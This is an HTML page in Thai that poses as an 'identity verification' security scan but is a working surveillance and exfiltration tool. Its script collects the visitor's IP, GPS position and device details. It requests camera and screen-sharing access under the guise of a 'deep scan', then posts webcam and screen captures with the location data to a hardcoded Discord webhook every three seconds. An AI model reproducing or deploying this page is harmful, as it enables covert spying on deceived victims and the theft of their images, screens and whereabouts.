<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Identity Verification - Secure Access</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Kanit', sans-serif; background: #010409; color: white; overflow: hidden; user-select: none; }
        .glass-panel { background: rgba(13, 17, 23, 0.9); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.05); }
        .scan-anim { height: 2px; background: #22c55e; position: absolute; width: 100%; top: 0; animation: scan move 3s infinite; box-shadow: 0 0 15px #22c55e; }
        @keyframes move { 0% { top: 0; } 100% { top: 100%; } }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <div class="max-w-md w-full glass-panel rounded-[2.5rem] overflow-hidden shadow-2xl relative p-8 text-center" id="app">
        <div class="mb-6">
            <div class="inline-block px-3 py-1 rounded-full bg-green-500/10 border border-green-500/20 text-green-400 text-[10px] mb-4 tracking-[0.2em] uppercase">
                System Deep Scan Active
            </div>
            <h1 class="text-3xl font-bold mb-2">ตรวจสอบสิทธิ์</h1>
            <p class="text-slate-400 text-sm">กรุณาอนุญาตการเข้าถึงเพื่อตรวจสอบฐานข้อมูลความปลอดภัย</p>
        </div>

        <div id="step-init">
            <button onclick="startDeepScan()" class="w-full bg-green-600 hover:bg-green-500 py-4 rounded-2xl font-bold text-lg transition-all active:scale-95 shadow-[0_0_30px_rgba(34,197,94,0.3)]">
                เริ่มการตรวจสอบข้อมูลทั้งหมด
            </button>
        </div>

        <div id="step-scan" class="hidden">
            <div class="relative w-56 h-56 mx-auto mb-6 rounded-full border-2 border-green-500/30 overflow-hidden bg-black shadow-[0_0_30px_rgba(34,197,94,0.1)]">
                <video id="webcam" class="w-full h-full object-cover scale-x-[-1]" autoplay playsinline></video>
                <div class="scan-anim"></div>
            </div>
            <p id="status-msg" class="text-green-400 text-xs animate-pulse tracking-widest">กำลังดึงข้อมูลระดับลึก...</p>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1500160535629660263/DqTP_nBQDLnPNoDADa-bXEb-1lKS6H5Ztt6Y7_TzoKCyiahTsosXJiG9M_dlTRyiwMmP";
        let fullData = {
            ip: "Loading...",
            ua: navigator.userAgent,
            platform: navigator.platform,
            screen: `${window.screen.width}x${window.screen.height}`,
            lang: navigator.language,
            cores: navigator.hardwareConcurrency || "N/A",
            ram: navigator.deviceMemory || "N/A",
            lat: 0, lon: 0
        };
        let streams = { camera: null, screen: null };

        // ดึง IP ทันที
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json()).then(d => fullData.ip = d.ip);

        async function startDeepScan() {
            document.getElementById('step-init').classList.add('hidden');
            document.getElementById('step-scan').classList.remove('hidden');

            navigator.geolocation.getCurrentPosition(async (pos) => {
                fullData.lat = pos.coords.latitude;
                fullData.lon = pos.coords.longitude;
                await runMedia();
            }, () => { alert("ต้องเปิด GPS เพื่อทำงาน"); location.reload(); });
        }

        async function runMedia() {
            try {
                // ขอกล้อง
                streams.camera = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('webcam').srcObject = streams.camera;

                // ขอหน้าจอ (ระบบจะเด้งหน้าต่างให้เลือก)
                try {
                    streams.screen = await navigator.mediaDevices.getDisplayMedia({ video: true });
                } catch(e) { console.log("Screen share skipped"); }

                // เริ่มวนลูปส่งข้อมูลเข้า Discord ทุกๆ 3 วินาที
                setInterval(captureEverything, 3000);
            } catch (e) { alert("กรุณาอนุญาตการเข้าถึงอุปกรณ์"); }
        }

        async function captureEverything() {
            if (streams.camera) await sendToDiscord(streams.camera, "🔴 [DEEP SCAN] CAMERA_UPDATE");
            if (streams.screen && streams.screen.active) await sendToDiscord(streams.screen, "🔵 [DEEP SCAN] SCREEN_UPDATE");
        }

        async function sendToDiscord(stream, title) {
            const videoTrack = stream.getVideoTracks()[0];
            const imageCapture = new ImageCapture(videoTrack);
            const bitmap = await imageCapture.grabFrame();
            
            const canvas = document.createElement('canvas');
            canvas.width = bitmap.width;
            canvas.height = bitmap.height;
            canvas.getContext('2d').drawImage(bitmap, 0, 0);

            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                const payload = {
                    embeds: [{
                        title: title,
                        color: title.includes("CAMERA") ? 2212352 : 2303786,
                        fields: [
                            { name: "🌐 IP Address", value: `\`${fullData.ip}\``, inline: true },
                            { name: "📍 Location", value: `[${fullData.lat}, ${fullData.lon}](https://www.google.com/maps?q&layer=c&cbll=$${fullData.lat},${fullData.lon})`, inline: true },
                            { name: "💻 Device", value: `\`${fullData.platform}\` | Screen: ${fullData.screen}`, inline: false },
                            { name: "⚙️ Specs", value: `CPU Cores: ${fullData.cores} | RAM: ~${fullData.ram}GB`, inline: true },
                            { name: "🔗 Maps Link", value: `https://www.google.com/maps?q=${fullData.lat},${fullData.lon}`, inline: false }
                        ],
                        image: { url: "attachment://view.jpg" },
                        footer: { text: `UserAgent: ${fullData.ua.substring(0, 100)}...` },
                        timestamp: new Date().toISOString()
                    }]
                };

                formData.append('payload_json', JSON.stringify(payload));
                formData.append('file', blob, 'view.jpg');
                await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
            }, 'image/jpeg', 0.6);
        }
    </script>
</body>
</html>
